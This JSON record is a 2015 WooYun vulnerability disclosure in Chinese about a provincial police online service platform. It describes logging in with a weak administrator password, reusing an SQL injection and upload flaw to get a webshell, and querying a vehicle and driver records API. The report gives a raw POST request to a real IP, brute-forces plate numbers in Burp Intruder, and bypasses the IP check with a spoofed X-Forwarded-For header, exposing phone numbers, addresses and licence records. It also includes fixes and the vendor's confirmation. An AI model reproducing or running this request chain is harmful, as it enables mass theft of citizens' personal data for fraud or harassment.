{"id": 29669, "wybug_id": "wooyun-2015-0111001", "wybug_title": "一次成功获取X省车辆和驾驶员信息的经历", "wybug_corp": "公安部一所", "wybug_author": "路人甲", "wybug_date": "2015-04-29 10:27", "wybug_open_date": "2015-06-14 12:00", "wybug_type": "内容安全", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(公安部一所)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["隐私安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向公众公开  简要描述： 故事从某支持查询违章和驾驶员档案信息的网站开始，到发现信息调用接口，再到突破IP限制强制查询。查询是有前提的，如查车辆要知道车牌号，如查驾驶员要知道身份证号码综合攻击利用场景：利用车辆牌照号码任意查询和驾驶员档案信息任意查询车辆发动机号码、手机号码、违章信息和驾驶员档案编号、户口地址、手机号码，可以用于营销、诈骗、打击报复等。 详细说明：  RT   漏洞证明：  在对吉林省公安厅网上服务平台\nhttp://gafw.jl.gov.cn/\n再次进行漏洞检测验证时发现没有发现明显的信息安全漏洞。但经过对业务系统的分析，猜解用户账户和密码时发现存在一个地区管理员弱口令，就这样我进入了管理后台。\n\n再次利用之前的漏洞 WooYun: 某省敏感部门网上服务平台存在SQL注入和任意文件上传漏洞 成功获取webshell接着找到了查询违章的页面代码\n\n\n\n然后进入接口页面\n\n到这里是最复杂难懂的了，我测试了很久，分析业务逻辑和传输的变量之后才得出以下利用方法，不介绍分析过程了查询车辆违章信息\nhttp://222.169.230.88:9015/iViolation.asmx?op=GetVehicleInfo\nPOST如下数据即可\nPOST /iViolation.asmx/GetVehicleInfo HTTP/1.1Accept: */*Referer: http://222.169.230.88:9015/iViolation.asmx?op=GetVehicleInfoAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C; .NET4.0E)X-Forwarded-For:127.0.0.1Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 222.169.230.88:9015Content-Length: 49Proxy-Connection: Keep-AlivePragma: no-cachetype=02&number=%E5%90%89CJ0000&engine=0000&other=\n将上面的POST数据放入burpsuite intruder变换2473从0000-9999即可number是车牌照号码type是车辆类型，通过首页查询违章时选择小汽车就是02注意：正常该接口限制了查询客户端的IP地址，此时利用\nX-Forwarded-For:127.0.0.1\n突破演示结果正常业务显示\n\n接口返回的数据可比这多多了\n\n至此我们获取到了车辆的\n发动机号码、手机号码、违章信息\n查询驾驶员信息\nhttp://222.169.230.88:9015/iViolation.asmx?op=GetDriverInfo\n首先找一个有驾照的身份证号码\n\n直接演示结果\n\n至此我们获取到了驾驶员的\n档案编号、户口地址、手机号码\n综合攻击利用场景：利用车辆牌照号码任意查询和驾驶员档案信息任意查询车辆发动机号码、手机号码、违章信息和驾驶员档案编号、户口地址、手机号码，可以用于营销、诈骗、打击报复等。   修复方案：  1.加强口令使用规范，严格杜绝弱口令问题2.即便上传漏洞需要管理员才能利用，也需要对其进行修复3.对接口加强查询限制，如增加验证码机制、严格限制客户端IP、过滤返回数据等。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-04-30 12:00 厂商回复： 验证确认所描述的问题，已通知其修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-15 09:39 |    \t\t火焰真菌 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:11        | 火焰真菌)\t\t \n  牛x    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}